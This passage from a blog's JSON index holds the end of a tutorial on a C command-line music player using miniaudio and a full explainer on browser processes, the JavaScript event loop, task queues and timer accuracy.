song.\\n\u0026#34;); return; } // Move the cursor to the next song cursor-\u0026gt;node = cursor-\u0026gt;node-\u0026gt;next; cursor-\u0026gt;index++; clearScreen(); } void prev(Cursor *cursor) { if (!isSelected(cursor)) return; if (cursor-\u0026gt;node-\u0026gt;prev == NULL) { printf(\u0026#34;This is the first song.\\n\u0026#34;); return; } cursor-\u0026gt;node = cursor-\u0026gt;node-\u0026gt;prev; cursor-\u0026gt;index--; clearScreen(); printf(\u0026#34;Playing %s\\n\u0026#34;, cursor-\u0026gt;node-\u0026gt;data.name); } Example of the Playlist Backend Implementation Player Implementation Next, we will build the core functionality of the music player. This includes loading songs, playing, pausing, and stopping playback. We will use the double linked list to manage the playlist. Now, we define the player structure and the corresponding functions.\n1 2 3 4 5 struct Player { ma_sound sound; ma_engine engine; } player; The Player structure contains the miniaudio sound and engine objects, which are used to play audio files. We will implement the following play function to play the selected song.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 void play(const char *path) { char buffer[strlen(path) + strlen(\u0026#34;./music/\u0026#34;) + strlen(\u0026#34;.mp3\u0026#34;) + 1]; strcpy(buffer, \u0026#34;./music/\u0026#34;); strcat(buffer, path); strcat(buffer, \u0026#34;.mp3\u0026#34;); stop(); ma_result result; result = ma_engine_init(NULL, \u0026amp;player.engine); if (result != MA_SUCCESS) { printf(\u0026#34;Failed to initialize audio engine.\u0026#34;); exit(1); } result = ma_sound_init_from_file(\u0026amp;player.engine, buffer, 0, NULL, NULL, \u0026amp;player.sound); if (result != MA_SUCCESS) { printf(\u0026#34;Failed to load sound file.\u0026#34;); exit(1); } ma_sound_set_looping(\u0026amp;player.sound, MA_TRUE); ma_sound_start(\u0026amp;player.sound); } The play function takes the path to the audio file as an argument and plays the file using the miniaudio library. It first stops the current playback, initializes the audio engine, and loads the sound file. Finally, it starts playing the sound.\nStop Function The stop function stops the current playback and cleans up the audio engine and sound objects.\n1 2 3 4 5 6 7 8 9 void stop() { if (ma_sound_is_playing(\u0026amp;player.sound)) { ma_sound_stop(\u0026amp;player.sound); } ma_sound_uninit(\u0026amp;player.sound); ma_engine_uninit(\u0026amp;player.engine); } The stop function checks if the sound is currently playing and stops it. It then uninitializes the sound and engine objects.\nConclusion In this blog post, we have laid the foundation for a CLI Music Player using C. We discussed the importance of such a project, set up the project structure, and implemented a double linked list to manage the playlist. In future posts, we will expand on this by adding more features and improving the user interface.\nStay tuned for more updates and happy coding!\nReferences GitHub Repository ","date":"2025-02-11T00:00:00+08:00","image":"https://xph0816.github.io/p/c-music-player/4ivv_hua574dfefd32d720d1387155b3ad52742_11569_120x120_fill_box_smart1_1.gif","permalink":"https://xph0816.github.io/p/c-music-player/","title":"C Music Player"},{"content":"Process Model of Browser What is a Process? Every program has their own memory space, and the program can only access the memory space of itself. This memory space is called Process.\nEach program has at least one process, and processes are isolated from each other. If a program wants to access the memory space of another program, it must use Inter-Process Communication, and need to be authorized by the operating system.\nWhat is a Thread? Once a process is created, it will have at least one thread, which is called Main Thread. If the program wants to do multiple things at the same time, it needs to create multiple threads.\nBrowser have which processes and threads? Browser is a multi-process and multi-threaded program. Multi-process uses to reduce the risk of crash, when open the browser, it will automatically create many processes. The main processes are:\nBrowser Process Network Process Renderer Process GPU Process Storage Service Process Audio Service Process The Most important processes are:\nBrowser Process Mainly responsible for interface display, user interaction, sub-process management, etc. The browser process will start multiple threads to handle different tasks. Network Process Responsible for loading network resources. The network process will start multiple threads to handle different network tasks. Renderer Process (The main process we will talk about in this lesson) After the renderer process is started, it will open a Renderer Main Thread, which is responsible for executing HTML, CSS, and JS code. By default, the browser will open a new renderer process for each tab to ensure that different tabs do not affect each other. This default mode may change in the future. Interested students can refer to the chrome official documentation\nHow does the Renderer Main Thread work? The renderer main thread is the busiest thread in the browser. The tasks it needs to handle include but are not limited to:\nParse HTML Parse CSS Calculate style Layout Paint Compositing Every frame rendering (60fps) Execute JS code Handle user interaction Handle timer events Handle network events \u0026hellip;\u0026hellip; and more Q: Why render process don\u0026rsquo;t use multiple threads to handle these tasks?\nA: Because the tasks are related to each other, and the order of execution is very important. If multiple threads are used to handle these tasks, it will be very difficult to ensure the order of execution.\nMain render thread faces a lot of tasks, and how does it schedule these tasks? example:\nWhen the main thread is executing a JS code, how does it handle the user\u0026rsquo;s click event? When the main thread is executing a JS code, the timer event is triggered, how does it handle the timer event? Browser process annouce that user click a button, and the same time, the timer event is triggered, how does the main thread handle these two events? \u0026hellip; Main thread use message queue to schedule these tasks.\nFrom the beginning, main thread will enter the Event Loop. Event Loop will check if there is any task in the Message Queue. If there is a task, it will take the task out of the message queue and execute it immediately. If not, it will wait for the task to be added to the message queue and enter the sleep state. Other threads (including other threads in the other processes) can add tasks to the message queue at any time. New tasks will be added to the end of the message queue. When new tasks are added, the main thread will wake up and take the task out of the message queue and execute it immediately. In this way, each task can be carried out in an orderly and continuous manner\nThe Whole Process is called Event Loop\nSome Explaination What is Asynchronous? Code in execution, there will be some tasks that cannot process immediately, Example:\nTasks that need to be performed after the timer is triggered \u0026ndash; setTimeout, setInterval Tasks that need to be performed after the network request is completed \u0026ndash; fetch, XMLHttpRequest Tasks that need to be performed after the user action is triggered \u0026ndash; addEventListener if main thread wait for these tasks to complete, it will block the main thread, and the main thread will not be able to handle other tasks, which will cause the page to freeze. Main thread focus on most important tasks, it must not be blocked. So, browser will use Asynchronous to handle these tasks. Use Asynchronous to handle these tasks, the main thread will not be blocked.\nQ: How do understand the asynchrony of JS?\nAnswer: JS is a single-threaded language, this is because the execution of JS code is performed in the main thread and main render thread is just only one thread and the main render thread need to handle a lot of tasks, like rendering, executing JS code, handling user interaction, handling timer events, handling network events, etc. Using synchronous to handle these tasks, the busy main thread will waste time in vain, and on the other hand, the page cannot be updated in time, causing the user to be stuck in the page. So the browser uses an asynchronous way to avoid it. The specific method is that when certain tasks occur, such as timers, network, and event monitoring, the main thread will hand over the tasks to other threads for processing, and immediately end the execution of the tasks by itself, and then execute subsequent codes. When other threads complete, wrap the callback function passed in advance into a task, add it to the end of the message queue, and wait for the main thread to schedule execution. In this asynchronous mode, the browser will never block, thus ensuring the smooth operation of single thread to the greatest extent.\nHow JS block the rendering? Here is an example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;h1\u0026gt;Hello World!\u0026lt;/h1\u0026gt; \u0026lt;button\u0026gt;change\u0026lt;/button\u0026gt; \u0026lt;script\u0026gt; var h1 = document.querySelector(\u0026#39;h1\u0026#39;); var btn = document.querySelector(\u0026#39;button\u0026#39;); // æ­»å¾ªç¯æŒ‡å®šçš„æ—¶é—´ function delay(duration) { var start = Date.now(); while (Date.now() - start \u0026lt; duration) {} } btn.onclick = function () { h1.textContent = \u0026#39;Donâ€™t want to Hello the Worldï¼\u0026#39;; delay(3000); }; \u0026lt;/script\u0026gt; After click the button, the h1 text will change after 3 seconds.\nPriority of the Message Queue Task don\u0026rsquo;t have priority, the message queue is FIFO (First In First Out).\nBut the message queue has priority.\nAccording to Latest W3C standard:\nEvery Task has a task type, the same task type must in the same queue, different task type must in different queue. In the Event Loop, browser will based on the task type to execute the task. The browser must prepare a micro-queue, and tasks in the micro-queue are executed prior to all other tasks https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint As the complexity of browsers has increased dramatically, the W3C no longer uses the term macro queue.\nIn the Chrome browser, the message queue is divided into various types:\nTimer Task Queue: used to store the callback task after the timer arrives, the priority is \u0026ldquo;medium\u0026rdquo; User Interaction Task Queue: used to store the callback task after the user interaction event is triggered, the priority is \u0026ldquo;high\u0026rdquo; Micro Task Queue: used to store micro tasks, the priority is \u0026ldquo;highest\u0026rdquo; Method to add micro task is to use Promise, MutationObserver\nExample:\n1 2 // Add a function to the micro task immediately Promise.resolve().then(fn) There are many other queues in the browser, which are not considered because they have little to do with our development\nInterview Question: Explain the event loop of JS\nAnswer:\nEvent Loop a.k.a Message Loop, is the way the browser\u0026rsquo;s rendering main thread works\nIn the Source Code of Chromium, it opens an endless for loop, and each loop will take the first task from the message queue and execute it, and other threads only need to add tasks to the end of the queue at the right time.\nIn the past, the message queue was simply divided into macro queues and micro queues. This statement is no longer applicable to the complex browser environment. Instead, it is a more flexible and changeable processing method.\nAccording to the official explanation of W3C, each task has a different type, and tasks of the same type must be in the same queue, and tasks of different types can belong to different queues. Different task queues have different priorities. In one event loop, the browser can decide which queue to take tasks from according to the actual situation. However, the browser must have a micro queue, and the tasks in the micro queue must have the highest priority and must be scheduled for execution first.\nInterview Question: Can the timer in JS be accurate? Why?\nAnswer:\nCannot be accurate, because:\nComputer hardware does not have an atomic clock, so it cannot be timed accurately. The timing function of the operating system itself has a small deviation. Since the timer of JS ultimately calls the function of the operating system, it also carries these deviations According to the W3C standard, when the browser implements the timer, if the nesting level exceeds 5 layers, it will have a minimum time of 4 milliseconds, which will bring deviations when the timing time is less than 4 milliseconds Affected by the event loop, the callback function of the timer can only run when the main thread is idle, which brings deviations again ","date":"2023-08-19T00:00:00+08:00","image":"https://developer.chrome.com/static/blog/inside-browser-part1/image/browser-architecture-9d143004c2a63_856.png","permalink":"https://xph0816.github.io/p/event-loop/","title":"Event Loop"}]